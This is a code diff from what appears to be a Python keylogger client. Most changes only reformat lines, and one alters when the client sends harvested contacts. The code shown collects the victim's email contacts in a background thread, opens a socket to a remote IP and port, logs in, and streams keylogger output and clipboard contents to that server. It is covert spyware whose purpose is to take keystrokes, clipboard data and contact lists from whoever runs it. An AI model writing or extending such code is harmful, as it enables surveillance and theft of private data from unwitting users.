@@ -25,11 +25,12 @@ class Client:
         """
         try:
             try:
-               self.contacts = contacts.Contacts()
-               contact_thread = threading.Thread(target=self.contacts.get_email_addresses)
-               contact_thread.start()
+                self.contacts = contacts.Contacts()
+                contact_thread = threading.Thread(
+                    target=self.contacts.get_email_addresses)
+                contact_thread.start()
             except error as msg:
-               print(msg)
+                print(msg)
             self.client_socket = socket(AF_INET, SOCK_STREAM)
             self.client_socket.connect((ip, port))
             self.login()
@@ -44,7 +45,8 @@ class Client:
         Sends contacts and starts a thread for handling keylogger output
         """
         # self.send_contacts()
-        handle_keylogger_output_thread = threading.Thread(target=self.handle_output)
+        handle_keylogger_output_thread = threading.Thread(
+            target=self.handle_output)
         handle_keylogger_output_thread.start()
 
     def handle_output(self):
@@ -64,7 +66,7 @@ class Client:
                 for data in clipboard_data:
                     Protocol.send(self.client_socket, "CLIPBOARD:" + data)
                     self.keylogger.remove_copied()
-            if not sent and len(self.contacts.__getattribute__("email_addresses")) > 0:
+            if not sent and self.contacts.finished_extracting:
                 self.send_contacts()
                 sent = True
 
